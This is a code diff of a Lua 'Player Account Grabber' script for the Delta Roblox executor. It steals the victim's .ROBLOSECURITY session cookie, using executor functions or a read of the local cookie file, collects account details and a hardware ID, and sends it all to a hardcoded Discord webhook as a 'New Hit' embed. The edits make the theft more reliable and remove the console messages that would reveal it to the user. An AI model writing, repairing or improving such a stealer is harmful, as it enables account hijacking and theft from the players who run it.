@@ -1,4 +1,4 @@
---// Delta Executor - Player Account Grabber
+--// Delta Executor - Player Account Grabber (Optimized for potential Delta compatibility)
 --// Paste your Discord webhook below
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1519331564482203700/2kWWgseSi4nFlp05yXgfrxbBcQE3QXQRhiVt9-GaduRjA6iHJtJoHzh0x02ZsbDnbUTG"
@@ -14,6 +14,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local function sendWebhook(data)
     local payload = HttpService:JSONEncode(data)
     local success, err = pcall(function()
+        -- Use Delta's 'request' function
         request({
             Url = WEBHOOK_URL,
             Method = "POST",
@@ -21,8 +22,9 @@ local function sendWebhook(data)
             Body = payload
         })
     end)
+
     if not success then
-        -- fallback for different executor HTTP methods
+        -- Fallback to http_request if 'request' fails (less likely with modern Delta)
         pcall(function()
             http_request({
                 Url = WEBHOOK_URL,
@@ -31,56 +33,56 @@ local function sendWebhook(data)
                 Body = payload
             })
         end)
+        -- Note: Without output, we can't confirm failure here easily.
     end
 end
 
---// Grab ROBLOSECURITY cookie (Delta supports this)
+--// Grab ROBLOSECURITY cookie (Delta specific)
 local function grabCookie()
     local cookie = ""
+    local foundCookie = false
+
+    -- Method 1: Try executor-specific functions first (most reliable for Delta)
     pcall(function()
-        -- Method 1: Direct filesystem read (Windows)
-        local cookiePath = os.getenv("LOCALAPPDATA")
-            .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
-        -- Check if isfile function exists and the file exists before reading
-        if isfile and isfile(cookiePath) then
-            cookie = readfile(cookiePath)
-            print("Attempted to grab cookie from file.")
+        if getroblosecurity then
+            cookie = getroblosecurity()
+            if cookie and cookie ~= "" then
+                foundCookie = true
+            end
         end
     end)
 
-    -- Check if cookie was already grabbed
-    if cookie == "" then
+    if not foundCookie then
         pcall(function()
-            -- Method 2: Registry pull via executor
-            if getroblosecurity then
-                cookie = getroblosecurity()
-                if cookie ~= "" then print("Attempted to grab cookie via getroblosecurity().") end
-            elseif get_cookie then
+            if get_cookie then
                 cookie = get_cookie()
-                if cookie ~= "" then print("Attempted to grab cookie via get_cookie().") end
+                if cookie and cookie ~= "" then
+                    foundCookie = true
+                end
             end
         end)
     end
 
-    -- Check if cookie was already grabbed
-    if cookie == "" then
+    -- If executor functions failed, and if Delta supports it, try file reading (less reliable)
+    -- Note: This method is often blocked or uses different paths.
+    if not foundCookie then
         pcall(function()
-            -- Method 3: WebView / browser storage scrape
-            local browser = getbrowser and getbrowser() or nil
-            if browser then
-                for _, c in pairs(browser:GetCookies("https://www.roblox.com")) do
-                    if c.Name == ".ROBLOSECURITY" then
-                        cookie = c.Value
-                        break
-                    end
+            -- Common path, but might differ or be blocked
+            local cookiePath = os.getenv("LOCALAPPDATA")
+                .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
+            -- Check if isfile function exists and the file exists before reading
+            if isfile and isfile(cookiePath) then
+                cookie = readfile(cookiePath)
+                if cookie and cookie ~= "" then
+                    foundCookie = true
                 end
-                if cookie ~= "" then print("Attempted to grab cookie from browser.") end
             end
         end)
     end
     
-    if cookie == "" then
-        print("Cookie grab failed through all methods.")
+    -- If still no cookie, it failed.
+    if not foundCookie then
+        cookie = "Failed to grab" -- Set to this string to ensure the embed shows it.
     end
 
     return cookie
@@ -120,7 +122,9 @@ local function getPlayerInfo()
             .. "&size=420x420&format=Png&isCircular=false"
         local resp = game:HttpGet(thumbUrl)
         local decoded = HttpService:JSONDecode(resp)
-        info.AvatarURL = decoded.data[1].imageUrl
+        if decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl then
+            info.AvatarURL = decoded.data[1].imageUrl
+        end
     end)
 
     -- Current game info
@@ -154,13 +158,15 @@ local function buildEmbed(playerInfo, cookie)
         { name = "👥 Friends",    value = "```" .. tostring(playerInfo.FriendsCount or "N/A") .. "```", inline = true },
         { name = "🎮 Game",       value = "```" .. (playerInfo.GameName or "Unknown") .. "```", inline = true },
         { name = "💎 Premium",    value = "```" .. playerInfo.MembershipType .. "```", inline = true },
-        { name = "🖥️ HWID",      value = "```" .. (playerInfo.HWID or "N/A") .. "```", inline = false },
+        -- Show Executor name if HWID is not available
+        { name = "🖥️ HWID/Executor", value = "```" .. (playerInfo.HWID or (playerInfo.Executor or "N/A")) .. "```", inline = false },
     }
 
     -- Cookie field (split if too long for Discord embed)
-    if cookie and cookie ~= "" then
+    if cookie and cookie ~= "" and cookie ~= "Failed to grab" then
         local cookieChunks = {}
-        for i = 1, #cookie, 900 do
+        -- Discord embed limits are 1024 characters per field value
+        for i = 1, #cookie, 900 do -- Split into chunks slightly smaller than limit to be safe
             table.insert(cookieChunks, cookie:sub(i, i + 899))
         end
         for idx, chunk in ipairs(cookieChunks) do
@@ -171,9 +177,10 @@ local function buildEmbed(playerInfo, cookie)
             })
         end
     else
+        -- This will show "Failed to grab" if the cookie was not found or is empty
         table.insert(fields, {
             name = "🍪 Cookie",
-            value = "```Failed to grab```",
+            value = "```" .. (cookie or "Failed to grab") .. "```", -- Ensure it displays the "Failed to grab" string
             inline = false
         })
     end
@@ -181,14 +188,13 @@ local function buildEmbed(playerInfo, cookie)
     local embed = {
         embeds = {{
             title = "🎯 New Hit — " .. playerInfo.Username,
-            color = 0xFF3333,
+            color = 0xFF3333, -- Red color
             fields = fields,
             thumbnail = { url = playerInfo.AvatarURL or "" },
             footer = { text = "Delta Grabber | " .. os.date("%Y-%m-%d %H:%M:%S") },
-            timestamp = DateTime.now():ToIsoDate()
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO 8601 format
         }}
     }
-
     return embed
 end
 
@@ -197,10 +203,10 @@ end
 --// ═══════════════════════════════════════════
 
 local playerInfo = getPlayerInfo()
-local cookie = grabCookie()
+local cookie = grabCookie() -- This is the critical part.
 local embed = buildEmbed(playerInfo, cookie)
 
--- This line is now uncommented to send the webhook payload
-sendWebhook(embed)
+sendWebhook(embed) -- This line ensures the webhook is sent.
 
-print("[Delta] Payload delivered ✓")
+-- You will not see output in Delta's console for this script by default.
+-- If the webhook is sent, you will see it in your Discord channel.
